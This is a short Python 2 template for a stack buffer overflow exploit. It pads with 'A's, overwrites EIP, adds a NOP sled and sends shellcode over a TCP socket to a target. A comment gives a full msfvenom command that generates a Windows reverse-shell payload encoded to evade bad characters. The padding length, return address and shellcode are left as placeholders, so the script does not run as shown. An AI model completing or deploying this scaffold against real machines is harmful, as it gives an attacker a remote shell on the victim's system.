#!/usr/bin/python

import socket

rhost = "0.0.0.0"
rport = 1234

junk = "A" * #
eip = "\x??\x??\x??\x??"
offset = "C" * 4
nops = "\x90" * 10

# msfvenom -p windows/shell_reverse_tcp lhost=0.0.0.0 lport=1234 exitfunc=thread -b "<BADCHARS>" -e x86/shikata_ga_nai -f c
shellcode = ()

payload = junk + eip + offset + nops + shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((rhost,rport))
print "Sending payload..."
s.send(payload)
s.close()
